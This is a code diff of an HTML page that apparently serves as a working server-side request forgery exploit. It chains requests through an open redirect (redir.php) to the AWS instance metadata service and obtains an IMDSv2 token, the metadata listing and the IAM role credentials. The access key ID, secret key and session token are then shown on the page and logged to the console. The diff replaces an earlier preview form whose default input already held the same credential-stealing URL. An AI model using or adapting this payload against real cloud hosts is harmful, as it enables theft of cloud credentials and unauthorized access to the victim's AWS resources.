@@ -1,89 +1,94 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Metadata Preview to PDF</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 20px;
-      background: #f0f0f0;
-    }
-    label, input, button {
-      font-size: 1rem;
-    }
-    #resultFrame {
-      margin-top: 20px;
-      width: 100%;
-      height: 600px;
-      border: 1px solid #ccc;
-      display: none;
-    }
-    #errorMsg {
-      color: red;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-
-  <h1>Preview Metadata as PDF</h1>
-  
-  <form id="previewForm">
-    <label for="metadataUrl">Enter metadata URL:</label><br />
-    <input type="text" id="metadataUrl" name="url" 
-           value="http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role" 
-           size="80" required />
-    <button type="submit">Generate PDF</button>
-  </form>
-
-  <div id="errorMsg"></div>
-
-  <!-- iframe to show PDF or preview -->
-  <iframe id="resultFrame"></iframe>
-
-  <script>
-    const form = document.getElementById('previewForm');
-    const iframe = document.getElementById('resultFrame');
-    const errorMsg = document.getElementById('errorMsg');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      errorMsg.textContent = '';
-      iframe.style.display = 'none';
-
-      const url = form.url.value.trim();
-      if (!url) {
-        errorMsg.textContent = 'Please enter a valid URL';
-        return;
+<!-- index.html -->
+<html>
+  <body>
+    <style>
+      h4 {
+        width: 1000px;
+        word-wrap: break-word;
+        overflow-wrap: break-word;
       }
+    </style>
 
+    <h4 id="token">Token</h4>
+    <br />
+    <h4 id="dirs">Dirs</h4>
+    <br />
+    <h4 id="credentials">Credentials</h4>
+
+    <script type="text/javascript">
+      let token = "";
+      let s3role = {};
+
+      // Step 1: Get token
+      const tokenRequest = new XMLHttpRequest();
+      tokenRequest.open(
+        "PUT",
+        "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token",
+        false
+      );
+      tokenRequest.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
       try {
-        // שולח בקשה ל־preview.php עם הפרמטר url
-        const response = await fetch('/preview.php?url=' + encodeURIComponent(url));
-
-        if (!response.ok) {
-          throw new Error('Server returned status ' + response.status);
-        }
-
-        const contentType = response.headers.get('Content-Type');
-
-        if (contentType === 'application/pdf') {
-          // מראה את ה-PDF ב-iframe
-          const blob = await response.blob();
-          const blobUrl = URL.createObjectURL(blob);
-          iframe.src = blobUrl;
-          iframe.style.display = 'block';
+        tokenRequest.send();
+        if (tokenRequest.status === 200) {
+          token = tokenRequest.responseText;
+          document.getElementById("token").innerText = "Token: " + token;
         } else {
-          // אם זה טקסט או JSON, מציג מתחת לטופס
-          const text = await response.text();
-          errorMsg.textContent = 'Response is not a PDF:\n' + text;
+          document.getElementById("token").innerText = "Token fetch failed";
         }
-      } catch (err) {
-        errorMsg.textContent = 'Error: ' + err.message;
+      } catch (e) {
+        document.getElementById("token").innerText = "Error: " + e.message;
       }
-    });
-  </script>
 
-</body>
+      // Step 2: Get meta-data
+      const metaRequest = new XMLHttpRequest();
+      metaRequest.open(
+        "GET",
+        "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/",
+        false
+      );
+      metaRequest.setRequestHeader("X-aws-ec2-metadata-token", token);
+      try {
+        metaRequest.send();
+        if (metaRequest.status === 200) {
+          document.getElementById("dirs").innerText = "Dirs:\n" + metaRequest.responseText;
+        } else {
+          document.getElementById("dirs").innerText = "Failed to fetch dirs";
+        }
+      } catch (e) {
+        document.getElementById("dirs").innerText = "Error: " + e.message;
+      }
+
+      // Step 3: Get credentials
+      const credsRequest = new XMLHttpRequest();
+      credsRequest.open(
+        "GET",
+        "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role",
+        false
+      );
+      credsRequest.setRequestHeader("X-aws-ec2-metadata-token", token);
+      try {
+        credsRequest.send();
+        if (credsRequest.status === 200) {
+          document.getElementById("credentials").innerText =
+            "Credentials:\n" + credsRequest.responseText;
+          s3role = JSON.parse(credsRequest.responseText);
+        } else {
+          document.getElementById("credentials").innerText = "Failed to fetch credentials";
+        }
+      } catch (e) {
+        document.getElementById("credentials").innerText = "Error: " + e.message;
+      }
+
+      // Optional: use credentials
+      if (s3role && s3role.Token) {
+        const accessToken = s3role.Token;
+        const secretKey = s3role.SecretAccessKey;
+        const accessKeyId = s3role.AccessKeyId;
+
+        console.log("Access Key ID:", accessKeyId);
+        console.log("Secret Access Key:", secretKey);
+        console.log("Session Token:", accessToken);
+      }
+    </script>
+  </body>
 </html>
